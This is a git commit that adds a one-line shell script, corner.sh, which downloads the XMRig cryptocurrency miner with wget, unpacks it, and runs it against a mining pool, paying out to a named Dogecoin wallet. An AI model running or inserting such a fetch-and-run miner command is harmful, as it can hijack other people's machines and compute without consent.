3779f33f3fe9d6897349b64a992cae89f889f9e8
frankie3999 <118435612+frankie3999@users.noreply.github.com>
2022-11-17 01:47:40 -0800

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/downloads/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -orx.unmineable.com:333 -a rx -k -u DOGE:DTgWTyhK1nzqSvZL7K8FcuW18wCdPQK8ya.cornertech -p x
